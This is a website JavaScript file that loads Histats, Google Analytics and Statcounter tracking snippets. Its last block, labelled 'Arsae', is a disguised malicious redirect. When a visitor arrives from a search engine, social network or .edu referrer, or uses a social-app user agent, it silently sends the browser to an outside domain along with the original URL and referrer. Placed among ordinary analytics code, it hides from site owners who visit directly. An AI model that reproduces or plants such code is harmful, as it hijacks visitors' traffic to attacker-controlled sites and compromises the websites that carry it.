//Histats
document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?xxxxxx&101"/>');


///// Analytics /////
document.write('<script async src="https://www.googletagmanager.com/gtag/js?id=G-xxxxx"></script>');

window.dataLayer = window.dataLayer || [];
function gtag() {
  dataLayer.push(arguments);
}
gtag('js', new Date());
gtag('config', 'G-xxxx');


///// Statcounter /////
var sc_project=xxx; 
var sc_invisible=1; 
var sc_security="xxxx";

document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
document.write('<noscript>');
document.write('<div class="statcounter">');
document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
document.write('<img class="statcounter" src="https://c.statcounter.com/ccccc/0/ccccc/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
document.write('</a>');
document.write('</div>');
document.write('</noscript>');

///// Arsae /////
var ars = 'http://singenengdomeng.com';
if(['.edu.', '.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
